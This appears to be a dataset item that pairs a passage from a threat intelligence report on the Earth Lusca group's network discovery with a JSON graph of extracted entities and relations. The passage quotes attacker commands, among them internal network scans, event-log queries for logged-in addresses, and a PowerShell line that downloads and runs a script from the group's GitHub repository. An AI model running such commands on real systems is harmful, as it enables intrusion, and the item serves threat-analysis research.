@@ -1,0 +1,68 @@
+
+
+
+Sentence : Discovery
+We have seen the threat actor using multiple scanning tools in different incidents to discover other
+machines in the same compromised network environment.
+|Tool Name|Command|
+|---|---|
+|HUC Port BannerScanner|hbs.exe 172.16.10.1-172.16.10.254 /m 445,3389,1433,3306,80,443|
+|nbtscan|nbtscan.exe 172.16.1.1/16|
+|fscan|fscanx86.exe -h 172.16.2.0/24 -m smb -t 100|
+Table 2. Scanning tools and observed commands
+NBTscan is a tool that helps users discover the network environment and any shared folders by scanning
+for NetBIOS name information. Fscan, on the other hand, is a comprehensive internal network scanning
+tool — written in Golang — that provides numerous functions including network scanning, vulnerability
+scanning, building reverse shells, and brute forcing common services.
+We could not find much information about hbs.exe . However, we identified a few file named “hbs.exe” on
+VirusTotal — possibly from the same threat actor since the files are signed with the same stolen
+certificate that Earth Lusca used to sign the other malware binaries. Analysis of the files revealed that it
+contained the string “HUC Port Banner Scanner,” which indicates that it is a port scanning tool.
+Earth Lusca also checked the Windows event log to find the network information of the successfully
+logged-in accounts (Event ID 4624). This allows the group to discover the addresses of other machines.
+The following commands were used for this:
+powershell “Get-EventLog -LogName security -Newest 500 | where {$.EventID -eq 4624} | format-list -
+_property * | findstr “Address””
+wevtutil qe security /format:text /q:”Event[System[(EventID=4624)] and
+EventData[Data[@Name=’TargetUserName’]=’administrator’]]”|find “Source Network Address”
+In addition, we saw that the threat actor employed a PowerShell script (RDPConnectionParser.ps1) to
+read and filter the Windows event log “Microsoft-Windows-TerminalServices-RDPClient/Operational”
+(Event ID 1024) in order to obtain the network information from remote desktop protocol (RDP)
+connections. This script is available publicly.
+We observed the following PowerShell command being used to launch the script.
+powershell IEX (New-
+ObjectNet.WebClient).DownloadString(‘https://raw.githubusercontent.com/yuilbrun/hmm/master/tas389
+.ps1’)
+It’s worth mentioning that Earth Lusca didn’t download the script from repositories that hosted it.
+However, they uploaded the script to their GitHub repository, yuibrun/hmm. We believe that the threat
+actor owns this GitHub account since it also has attack tools and malware uploaded to it. We will share
+our findings on the GitHub account in the “Additional Findings” subsection.
+Output : 
+{
+    "nodes": [
+        {"id": 1, "description": "HUC Port BannerScanner", "type": "APPS"},
+        {"id": 2, "description": "hbs.exe", "type": "EXEF"},
+        {"id": 3, "description": "172.16.10.1-172.16.10.254", "type": "CCSH"},
+        {"id": 4, "description": "nbtscan.exe", "type": "EXEF"},
+        {"id": 5, "description": "172.16.1.1/16", "type": "CCSH"},
+        {"id": 6, "description": "fscanx86.exe", "type": "EXEF"},
+        {"id": 7, "description": "172.16.2.0/24", "type": "CCSH"},
+        {"id": 8, "description": "Event ID 4624", "type": "REGI"},
+        {"id": 9, "description": "RDPConnectionParser.ps1", "type": "EXEF"},
+        {"id": 10, "description": "Microsoft-Windows-TerminalServices-RDPClient/Operational", "type": "REGI"},
+        {"id": 11, "description": "Event ID 1024", "type": "REGI"},
+        {"id": 12, "description": "https://raw.githubusercontent.com/yuilbrun/hmm/master/tas389.ps1", "type": "URLS"},
+        {"id": 13, "description": "yuilbrun/hmm", "type": "SOCM"},
+        {"id": 14, "description": "Earth Lusca", "type": "ACTO"}
+    ],
+    "edges": [
+        {"source": 2, "target": 3, "rel_name": "scans"},
+        {"source": 4, "target": 5, "rel_name": "scans"},
+        {"source": 6, "target": 7, "rel_name": "scans"},
+        {"source": 14, "target": 8, "rel_name": "checks"},
+        {"source": 9, "target": 10, "rel_name": "reads from"},
+        {"source": 10, "target": 11, "rel_name": "contains event"},
+        {"source": 12, "target": 9, "rel_name": "downloads to"},
+        {"source": 14, "target": 13, "rel_name": "owns"}
+    ]
+}
